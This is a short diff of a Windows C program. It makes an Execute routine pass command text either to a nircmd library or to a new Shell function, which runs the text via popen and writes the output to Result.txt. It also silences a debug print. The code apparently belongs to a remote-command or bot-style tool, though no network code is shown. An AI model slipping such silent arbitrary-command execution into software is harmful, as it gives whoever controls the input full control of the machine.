@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <string.h>
 #include <windows.h> 
+#include <stdlib.h>
 
 typedef int (__cdecl *function_nircmd)(char*); 
 
@@ -33,7 +34,7 @@ void Nircmd(char *text){
             ptr[i - 7] = text[i];
         }
     }
-    printf("%s", ptr);
+    //printf("%s", ptr);
 
     HINSTANCE hinstLib; 
     function_nircmd nircmd; 
@@ -67,7 +68,23 @@ void Nircmd(char *text){
 
 
 
-void Shell(){
+void Shell(char *text){
+
+    FILE *fp;
+    FILE *result;
+  
+    char buffer[500];
+    fp = popen(text,"r");
+    result = fopen("Result.txt", "w");
+
+    while (fgets(buffer, sizeof(buffer),fp) != NULL)
+    {
+                
+        fprintf(result, "%s\n", buffer);
+
+    }
+    fclose(result);
+    pclose(fp);
 
 }
 
@@ -78,8 +95,8 @@ void Execute(char *text)
 
         Nircmd(text);
     }
-
-
-
+    else {
+        Shell(text);
+    }
 
 }
